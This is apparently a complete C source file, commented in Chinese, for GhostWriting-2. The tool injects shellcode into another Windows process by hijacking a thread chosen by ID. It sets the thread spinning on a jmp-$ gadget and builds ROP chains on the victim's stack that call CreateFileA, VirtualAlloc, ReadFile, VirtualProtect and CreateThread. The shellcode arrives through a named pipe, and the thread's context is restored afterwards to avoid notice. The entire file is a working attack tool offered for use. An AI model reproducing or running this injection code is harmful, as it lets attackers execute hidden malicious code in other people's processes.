// GhostWriting-2 - 改进版幽灵写入注入
// 原作者: fern89 (2024)
// 基于原始 GhostWriting by c0de90e7 (2007)
//
// 主要改进：
// 1. 使用 Named Pipe 快速传输 shellcode（而非逐 DWORD 写入）
// 2. 简化的 Gadget（push edx; call eax，而非 mov [reg],reg）
// 3. 无需 HWND，仅需 TID
// 4. 无 RWX 内存（使用 VirtualProtect）
// 5. 线程不被牺牲，执行后完全恢复

#include <windows.h>
#include <stdio.h>
#include "helpers.h"
#include "shellcode.h"

#define HEAP_ALLOC 0x1000  // 在目标进程堆上分配的内存大小
#define gpa(x, y) ((unsigned int)GetProcAddress(GetModuleHandleA(x), y))

int main(int argc, char** argv) {
    // Named Pipe 名称（包含 null 字节，总长度需要是 4 的倍数以便写入栈）
    unsigned char pipename[] = "\\\\.\\pipe\\spookypipe";

    if (argc < 2) {
        printf("Usage: %s <thread_id>\n", argv[0]);
        printf("\nExample:\n");
        printf("  %s 1234\n\n", argv[0]);
        printf("Tip: Use Process Hacker or similar tools to find thread IDs\n");
        return 1;
    }

    DWORD tid = atoi(argv[1]);
    printf("=== GhostWriting-2 Injection ===\n");
    printf("Target Thread ID: %lu\n\n", tid);

    // ========== 阶段 1: Gadget 搜索 ==========
    printf("[*] Finding gadgets...\n");

    pshc = findr("\x52\xFF\xD0", 3, "ntdll.dll");              // push edx; call eax
    jmps = findr("\xEB\xFE", 2, "kernelbase.dll");             // jmp $
    ret  = findr("\xC3", 1, "kernelbase.dll");                 // ret

    if (pshc == 0 || jmps == 0 || ret == 0) {
        printf("[-] Error! Gadgets could not be found!\n");
        printf("    This may happen on certain Windows versions (e.g., Windows 8.1)\n");
        return -1;
    }

    printf("[+] Found gadgets:\n");
    printf("    push edx; call eax: 0x%08X\n", pshc);
    printf("    jmp $:              0x%08X\n", jmps);
    printf("    ret:                0x%08X\n\n", ret);

    // ========== 阶段 2: 打开线程 ==========
    HANDLE thd = OpenThread(THREAD_GET_CONTEXT | THREAD_SET_CONTEXT | THREAD_SUSPEND_RESUME | THREAD_QUERY_INFORMATION,
                            FALSE, tid);
    if (thd == NULL) {
        printf("[-] Error! Could not acquire thread handle (error: %lu)\n", GetLastError());
        return -1;
    }

    printf("[+] Acquired thread handle\n\n");

    // ========== 阶段 3: 设置线程到 jmp $ 自锁 ==========
    printf("[*] Priming thread, setting EIP to jmp $...\n");

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    GetThreadContext(thd, &ctx);

    unsigned int oeip = ctx.Eip;  // 保存原始 EIP
    ctx.Eip = jmps;               // 设置 EIP 到 jmp $
    SetThreadContext(thd, &ctx);
    ctx.Eip = oeip;               // 恢复原始 EIP 到 ctx（后续恢复用）

    ResumeThread(thd);
    printf("[*] Waiting for kernel exit...\n");

    // 等待线程从内核态退出，进入用户态的 jmp $ 自锁
    waitunblock(thd);
    printf("[+] Process exited kernel, ready for injection\n\n");

    DWORD t0 = GetTickCount();

    // ========== 阶段 4: 注入 Named Pipe 名称到栈 ==========
    printf("[*] Injecting pipe name to stack...\n");

    // Push 一个垃圾值到栈（简化后续代码）
    opening(thd);

    // 逐个 DWORD 将 pipe 名称 push 到栈（倒序）
    int j;
    unsigned int namptr;
    for (j = sizeof(pipename); j > 0; j -= 4) {
        unsigned int num = 0;
        memcpy(&num, pipename + j - 4, 4);
        namptr = push(num);
    }

    printf("[+] Pipe name injected to stack at 0x%08X\n\n", namptr);

    // ========== 阶段 5: 创建 Named Pipe ==========
    printf("[*] Creating named pipe...\n");

    HANDLE pipe = CreateNamedPipe(pipename,
                                  PIPE_ACCESS_OUTBOUND,
                                  PIPE_TYPE_BYTE,
                                  1,
                                  HEAP_ALLOC,
                                  0,
                                  5000,
                                  NULL);

    if (pipe == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to create pipe (error: %lu)\n", GetLastError());
        return -1;
    }

    printf("[+] Named pipe created\n\n");

    // ========== 阶段 6: ROP 调用 CreateFileA 连接管道 ==========
    printf("[*] Calling CreateFileA to connect victim to pipe...\n");

    // Push CreateFileA 参数（倒序）
    push(0);                         // hTemplateFile
    push(FILE_ATTRIBUTE_NORMAL);     // dwFlagsAndAttributes
    push(OPEN_EXISTING);             // dwCreationDisposition
    push(0);                         // lpSecurityAttributes
    push(FILE_SHARE_READ);           // dwShareMode
    push(GENERIC_READ);              // dwDesiredAccess
    push(namptr);                    // lpFileName
    push(jmps);                      // 返回地址（jmp $）
    push(gpa("kernel32.dll", "CreateFileA"));  // 函数地址

    // 执行 ROP
    slay(thd);

    waitunblock(thd);
    unsigned int phand = getretpush(0, thd);  // 获取管道句柄（CreateFileA 的返回值）
    printf("[+] Pipes connected, handle: 0x%08X\n\n", phand);

    // ========== 阶段 7: ROP 调用 VirtualAlloc 分配内存 ==========
    printf("[*] Calling VirtualAlloc to allocate RW memory...\n");

    push(PAGE_READWRITE);            // flProtect
    push(MEM_COMMIT);                // flAllocationType
    push(HEAP_ALLOC);                // dwSize
    push(0);                         // lpAddress
    push(jmps);                      // 返回地址
    push(gpa("kernelbase.dll", "VirtualAlloc"));

    // 执行 ROP
    slay(thd);

    waitunblock(thd);
    unsigned int addr = getretpush(0, thd);  // 获取分配的内存地址
    printf("[+] VirtualAlloc'd memory at 0x%08X\n\n", addr);

    // ========== 阶段 8: 准备 ROP 链 ==========
    printf("[*] Preparing ROP sled...\n");
    printf("    ROP chain: ReadFile -> CloseHandle -> VirtualProtect -> CreateThread\n\n");

    // CreateThread 参数
    push(0);                         // lpThreadId
    push(0);                         // dwCreationFlags
    push(addr);                      // lpStartAddress（shellcode 地址）
    push(0);                         // lpParameter
    push(0);                         // dwStackSize
    push(jmps);                      // 返回地址
    push(gpa("kernel32.dll", "CreateThread"));

    // VirtualProtect 参数
    push(namptr);                    // lpflOldProtect（重用栈空间）
    push(PAGE_EXECUTE_READ);         // flNewProtect
    push(HEAP_ALLOC);                // dwSize
    push(addr);                      // lpAddress
    push(ret);                       // 返回地址（继续执行下一个 ROP）
    push(gpa("kernelbase.dll", "VirtualProtect"));

    // CloseHandle 参数
    push(phand);                     // hObject
    push(ret);                       // 返回地址
    push(gpa("kernel32.dll", "CloseHandle"));

    // ReadFile 参数（从 pipe 读取 shellcode）
    push(0);                         // lpOverlapped
    push(namptr);                    // lpNumberOfBytesRead（重用栈空间）
    push(HEAP_ALLOC);                // nNumberOfBytesToRead
    push(addr);                      // lpBuffer
    push(phand);                     // hFile
    push(ret);                       // 返回地址
    push(gpa("kernel32.dll", "ReadFile"));

    // ========== 阶段 9: 写入 Shellcode 到管道 ==========
    printf("[*] Writing shellcode to pipe (%lu bytes)...\n", (unsigned long)sizeof(buf));

    DWORD bw;
    WriteFile(pipe, buf, sizeof(buf), &bw, NULL);

    printf("[+] Data written to pipe\n\n");

    // ========== 阶段 10: 执行 ROP 链 ==========
    printf("[*] Executing ROP sled...\n");
    slay(thd);

    printf("[*] Waiting for shellcode thread creation...\n");
    waitunblock(thd);

    printf("[+] Execution completed!\n\n");

    // ========== 阶段 11: 恢复线程原始状态 ==========
    printf("[*] Restoring original thread context...\n");

    DisconnectNamedPipe(pipe);
    CloseHandle(pipe);

    SuspendThread(thd);
    SetThreadContext(thd, &ctx);
    ResumeThread(thd);

    printf("[+] Thread restored\n\n");
    printf("[+] Full injection sequence done. Time elapsed: %lums\n", GetTickCount() - t0);

    CloseHandle(thd);
    return 0;
}
